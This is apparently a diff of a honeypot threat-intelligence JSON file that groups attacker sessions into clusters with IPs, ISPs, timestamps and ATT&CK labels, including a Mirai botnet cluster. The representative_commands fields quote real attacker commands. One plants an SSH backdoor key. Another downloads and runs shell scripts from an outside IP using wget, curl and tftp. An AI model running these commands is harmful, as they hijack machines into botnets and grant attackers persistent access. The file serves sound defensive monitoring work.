-      "sequence_hash": "ccd29aff2c593ed4",
+      "session_count": 2,
+      "unique_ips": [
+        "101.79.165.43",
+        "106.243.155.71"
+      ],
+      "unique_ip_count": 2,
+      "sequence_hash": "98af0db988d5971c",
       "ttps": [
         {
-          "id": "T1082",
-          "name": "System Information Discovery"
+          "id": "T1021.004",
+          "name": "Remote Services: SSH"
+        },
+        {
+          "id": "T1078",
+          "name": "Valid Accounts"
+        },
+        {
+          "id": "T1070",
+          "name": "Indicator Removal"
+        },
+        {
+          "id": "T1140",
+          "name": "Deobfuscate/Decode Files"
+        },
+        {
+          "id": "T1105",
+          "name": "T1105"
         }
       ],
       "representative_commands": [
-        "uname -a; echo -e \"\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A\"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.p"
+        "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+        "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
       ],
       "members": [
         {
-          "session_id": "IR-0f0500388b60",
-          "src_ip": "130.12.180.51",
-          "country": "DE",
-          "isp": "Virtualine Technologies",
-          "command_count": 1,
-          "timestamp": "2026-08-25T07:36:39.696772Z"
+          "session_id": "IR-67feeb156a67",
+          "src_ip": "101.79.165.43",
+          "country": "HK",
+          "isp": "CDNetworks",
+          "command_count": 2,
+          "timestamp": "2026-08-25T10:17:44.730786Z"
+        },
+        {
+          "session_id": "IR-d86e15816240",
+          "src_ip": "106.243.155.71",
+          "country": "KR",
+          "isp": "LG DACOM Corporation",
+          "command_count": 2,
+          "timestamp": "2026-08-25T10:28:37.503389Z"
         }
       ]
     },
@@ -939,29 +192,1754 @@
       "campaign_severity": null,
       "campaign_description": null,
       "matched_campaigns": [],
-      "session_count": 1,
+      "session_count": 2,
       "unique_ips": [
-        "222.88.163.202"
+        "111.53.8.101"
       ],
       "unique_ip_count": 1,
-      "sequence_hash": "6fa4c8ac58e7a1d9",
+      "sequence_hash": "ce810d21e5e52f01",
       "ttps": [
         {
-          "id": "T1082",
-          "name": "System Information Discovery"
+          "id": "T1592",
+          "name": "Gather Victim Host Info"
         }
       ],
       "representative_commands": [
-        "uname -s -m"
+        "grep -c ^processor /proc/cpuinfo"
       ],
       "members": [
         {
-          "session_id": "IR-d4ab49602546",
-          "src_ip": "222.88.163.202",
+          "session_id": "IR-16a14f76f613",
+          "src_ip": "111.53.8.101",
           "country": "CN",
-          "isp": "CHINANET henan province network",
+          "isp": "China Mobile Communications Corporation",
           "command_count": 1,
-          "timestamp": "2026-08-25T08:25:47.378677Z"
+          "timestamp": "2026-08-25T09:08:31.201403Z"
+        },
+        {
+          "session_id": "IR-2cc35809adad",
+          "src_ip": "111.53.8.101",
+          "country": "CN",
+          "isp": "China Mobile Communications Corporation",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:08:34.413798Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-004",
+      "is_campaign": true,
+      "campaign_name": "Mirai/IoT Botnet",
+      "campaign_severity": "HIGH",
+      "campaign_description": "Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.",
+      "matched_campaigns": [
+        {
+          "name": "Mirai/IoT Botnet",
+          "ttps": [
+            "T1105",
+            "T1059.004"
+          ],
+          "severity": "HIGH",
+          "description": "Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.",
+          "pattern_hits": 1,
+          "pattern_total": 3
+        }
+      ],
+      "session_count": 209,
+      "unique_ips": [
+        "45.135.194.26"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "4d0eda19d64b056a",
+      "ttps": [
+        {
+          "id": "T1105",
+          "name": "Ingress Tool Transfer"
+        },
+        {
+          "id": "T1140",
+          "name": "Deobfuscate/Decode Files"
+        },
+        {
+          "id": "T1059.004",
+          "name": "T1059.004"
+        }
+      ],
+      "representative_commands": [
+        "cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget http://213.232.114.14/handshakebins.sh 2>/dev/null; busybox wget http://213.232.114.14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh http://213.232.114.14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114.14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114.14 2>/dev/null"
+      ],
+      "members": [
+        {
+          "session_id": "IR-b002b1db79bb",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:54:45.161157Z"
+        },
+        {
+          "session_id": "IR-3ebf8d7846d1",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:54:46.585237Z"
+        },
+        {
+          "session_id": "IR-ff013bee46c6",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:54:48.111014Z"
+        },
+        {
+          "session_id": "IR-f6480227c6e3",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:54:49.664521Z"
+        },
+        {
+          "session_id": "IR-47a15baf024f",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:54:51.075790Z"
+        },
+        {
+          "session_id": "IR-2ded781ce9d4",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:54:52.573612Z"
+        },
+        {
+          "session_id": "IR-9b3dd5435d8f",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:54:53.989364Z"
+        },
+        {
+          "session_id": "IR-9a3b50d0fb0f",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:54:55.370182Z"
+        },
+        {
+          "session_id": "IR-62d403ffe010",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:54:56.885827Z"
+        },
+        {
+          "session_id": "IR-84d7e71bc9ef",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:54:58.278299Z"
+        },
+        {
+          "session_id": "IR-2a8784907caf",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:54:59.761247Z"
+        },
+        {
+          "session_id": "IR-f36ae82f2aba",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:55:01.315238Z"
+        },
+        {
+          "session_id": "IR-20b128ffc556",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:55:02.766064Z"
+        },
+        {
+          "session_id": "IR-7d5f619bcb3a",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:55:04.280057Z"
+        },
+        {
+          "session_id": "IR-43101f26e427",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:55:05.793484Z"
+        },
+        {
+          "session_id": "IR-af7426c4b25a",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:55:07.183955Z"
+        },
+        {
+          "session_id": "IR-ab50aff7e74f",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:55:08.784083Z"
+        },
+        {
+          "session_id": "IR-bbe2a3a3a0bc",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:55:10.256897Z"
+        },
+        {
+          "session_id": "IR-749341719230",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:55:11.769467Z"
+        },
+        {
+          "session_id": "IR-3346804a0606",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:55:13.284305Z"
+        },
+        {
+          "session_id": "IR-db06250780d9",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:55:14.654499Z"
+        },
+        {
+          "session_id": "IR-b643ab4ef5e1",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:55:17.299486Z"
+        },
+        {
+          "session_id": "IR-ddc085a21aea",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:55:18.684231Z"
+        },
+        {
+          "session_id": "IR-ebd585fe4348",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:55:20.164445Z"
+        },
+        {
+          "session_id": "IR-0f80751a2ca7",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:55:21.563884Z"
+        },
+        {
+          "session_id": "IR-3dab9cf5fe3c",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:55:23.108005Z"
+        },
+        {
+          "session_id": "IR-9e49d8457d0a",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:55:24.680702Z"
+        },
+        {
+          "session_id": "IR-c3037b1ceb19",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:55:26.101265Z"
+        },
+        {
+          "session_id": "IR-6a4e9cb61bf2",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:55:27.570316Z"
+        },
+        {
+          "session_id": "IR-b31d0081eb73",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:55:29.062364Z"
+        },
+        {
+          "session_id": "IR-1f993ef9334d",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:55:30.494438Z"
+        },
+        {
+          "session_id": "IR-249a423e932b",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:55:32.000001Z"
+        },
+        {
+          "session_id": "IR-0d29feda2388",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:55:33.543793Z"
+        },
+        {
+          "session_id": "IR-49bafa236cd9",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:55:34.982851Z"
+        },
+        {
+          "session_id": "IR-f7215cf1bef1",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:55:36.555073Z"
+        },
+        {
+          "session_id": "IR-9f079c261513",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:55:37.978305Z"
+        },
+        {
+          "session_id": "IR-f57a75008a12",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:55:39.507569Z"
+        },
+        {
+          "session_id": "IR-f66f70eec399",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:55:40.996169Z"
+        },
+        {
+          "session_id": "IR-3fc4cf2aab46",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:55:42.393262Z"
+        },
+        {
+          "session_id": "IR-4c81bc4d8906",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:55:43.861084Z"
+        },
+        {
+          "session_id": "IR-1e4b8adb3bc9",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:55:45.376096Z"
+        },
+        {
+          "session_id": "IR-05f0885c6db8",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:55:46.783159Z"
+        },
+        {
+          "session_id": "IR-50ed5f407549",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:55:48.336874Z"
+        },
+        {
+          "session_id": "IR-ea88958b6a4e",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:55:49.765566Z"
+        },
+        {
+          "session_id": "IR-8d789b5ce452",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:55:51.272714Z"
+        },
+        {
+          "session_id": "IR-874d8bd38ac0",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:55:52.802936Z"
+        },
+        {
+          "session_id": "IR-c21da72feaaa",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:55:54.247803Z"
+        },
+        {
+          "session_id": "IR-e645b6733643",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:55:55.786990Z"
+        },
+        {
+          "session_id": "IR-0cde94ecdd1d",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:55:57.322817Z"
+        },
+        {
+          "session_id": "IR-b11ab43fde77",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:55:58.789930Z"
+        },
+        {
+          "session_id": "IR-bcc8f94f2799",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:56:00.301318Z"
+        },
+        {
+          "session_id": "IR-e9f7f36185b1",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:56:01.871163Z"
+        },
+        {
+          "session_id": "IR-ea21a6391143",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:56:03.304197Z"
+        },
+        {
+          "session_id": "IR-4594fab502cc",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:56:04.901591Z"
+        },
+        {
+          "session_id": "IR-bd8d54529d39",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:56:06.357010Z"
+        },
+        {
+          "session_id": "IR-d668e4e80f2f",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:56:07.885889Z"
+        },
+        {
+          "session_id": "IR-de5858c3bf28",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:56:09.465830Z"
+        },
+        {
+          "session_id": "IR-40533f13d79d",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:56:10.851290Z"
+        },
+        {
+          "session_id": "IR-2b01665329f9",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:56:12.347746Z"
+        },
+        {
+          "session_id": "IR-bb40a1a96d84",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:56:13.905003Z"
+        },
+        {
+          "session_id": "IR-796b407b52c7",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:56:15.380599Z"
+        },
+        {
+          "session_id": "IR-be4629ee9e75",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:56:16.881908Z"
+        },
+        {
+          "session_id": "IR-25cd7f9f093c",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:56:18.382238Z"
+        },
+        {
+          "session_id": "IR-682913d2b0b6",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:56:19.921610Z"
+        },
+        {
+          "session_id": "IR-e833694b3ac5",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:56:21.462058Z"
+        },
+        {
+          "session_id": "IR-59d9ffe92d66",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:56:22.936242Z"
+        },
+        {
+          "session_id": "IR-979b98ae879d",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:56:24.468686Z"
+        },
+        {
+          "session_id": "IR-49c32e9dc5b3",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:56:26.042774Z"
+        },
+        {
+          "session_id": "IR-783bad9b490f",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:56:27.458727Z"
+        },
+        {
+          "session_id": "IR-b106d40ec9c2",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:56:29.001122Z"
+        },
+        {
+          "session_id": "IR-06d63c42e5b9",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:56:30.459154Z"
+        },
+        {
+          "session_id": "IR-b3a4cb5650c6",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:56:31.882577Z"
+        },
+        {
+          "session_id": "IR-8f371b8e0199",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:56:33.385070Z"
+        },
+        {
+          "session_id": "IR-b88875cec707",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:56:34.788120Z"
+        },
+        {
+          "session_id": "IR-28667cb66d0c",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:56:36.295516Z"
+        },
+        {
+          "session_id": "IR-40967f5f0278",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:56:37.902766Z"
+        },
+        {
+          "session_id": "IR-37b352289ac1",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:56:39.350160Z"
+        },
+        {
+          "session_id": "IR-680dfa6e41e8",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:56:40.903472Z"
+        },
+        {
+          "session_id": "IR-81c440847513",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:56:42.390646Z"
+        },
+        {
+          "session_id": "IR-ae08d97889b0",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:56:43.786768Z"
+        },
+        {
+          "session_id": "IR-d4be4913150b",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:56:45.260023Z"
+        },
+        {
+          "session_id": "IR-df63772bc8bd",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:56:46.662477Z"
+        },
+        {
+          "session_id": "IR-eefa6c18c980",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:56:48.186453Z"
+        },
+        {
+          "session_id": "IR-e65b3f0ea860",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:56:49.689992Z"
+        },
+        {
+          "session_id": "IR-1bfade399939",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:56:51.102030Z"
+        },
+        {
+          "session_id": "IR-ee893eac099e",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:56:52.588644Z"
+        },
+        {
+          "session_id": "IR-0ba42dca0051",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:56:54.068550Z"
+        },
+        {
+          "session_id": "IR-ebc505b95a40",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:56:55.476672Z"
+        },
+        {
+          "session_id": "IR-63f6aeae8d32",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:56:56.987381Z"
+        },
+        {
+          "session_id": "IR-e6a635a33409",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:56:58.542871Z"
+        },
+        {
+          "session_id": "IR-81822d817e9d",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:56:59.999580Z"
+        },
+        {
+          "session_id": "IR-8cd78f7be7dc",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:57:01.486234Z"
+        },
+        {
+          "session_id": "IR-3f8573086808",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:57:02.914720Z"
+        },
+        {
+          "session_id": "IR-3e6fdd7ca109",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:57:05.561017Z"
+        },
+        {
+          "session_id": "IR-d3d4a077fc3d",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:57:07.023027Z"
+        },
+        {
+          "session_id": "IR-06d6c8ba38d3",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:57:08.531258Z"
+        },
+        {
+          "session_id": "IR-3fe2d48c9278",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:57:09.988580Z"
+        },
+        {
+          "session_id": "IR-96a6f0021972",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:57:11.423879Z"
+        },
+        {
+          "session_id": "IR-bed15d9f4d15",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:57:12.977295Z"
+        },
+        {
+          "session_id": "IR-c22b63bbadd6",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:57:14.419142Z"
+        },
+        {
+          "session_id": "IR-c769e44b383d",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:57:15.990699Z"
+        },
+        {
+          "session_id": "IR-f0118da015c8",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:57:17.595278Z"
+        },
+        {
+          "session_id": "IR-1900188ff639",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:57:19.004021Z"
+        },
+        {
+          "session_id": "IR-9c47ef3b7824",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:57:20.500409Z"
+        },
+        {
+          "session_id": "IR-99ae5eaea094",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
+          "timestamp": "2026-08-25T09:57:22.093418Z"
+        },
+        {
+          "session_id": "IR-f73e4edf2440",
+          "src_ip": "45.135.194.26",
+          "country": "DE",
+          "isp": "Pfcloud UG",
+          "command_count": 1,
